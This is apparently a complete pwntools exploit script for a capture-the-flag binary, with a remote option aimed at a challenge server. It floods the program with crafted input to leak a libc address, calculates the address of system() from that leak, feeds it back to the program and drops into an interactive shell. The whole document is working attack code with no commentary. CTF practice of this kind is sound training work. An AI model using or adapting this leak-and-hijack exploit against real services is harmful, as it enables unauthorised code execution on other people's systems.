from pwn import *
from icecream import ic

elf = exe = ELF("./chal_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
# context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("be.ax", 32323)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000012af
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def leak(ind):
    sl(b'1')
    sl(f'{ind}%s'.encode())

for i in range(10):
    for j in range(400):
        leak('1')
        io.clean()

io.clean()
for i in range(753):
    leak('2')
    io.clean()

leak('1')
ru('111111111111111')
re(47)
# leak = u64(re(8))
leak = u64((b'\x00'+re(5)).ljust(8, b'\x00'))
ic(hex(leak))
libc.address = leak - 0x1f2000
sys = libc.sym['system']
ic(hex(sys))

sl(b'2')
sl(hex(sys))
io.interactive()
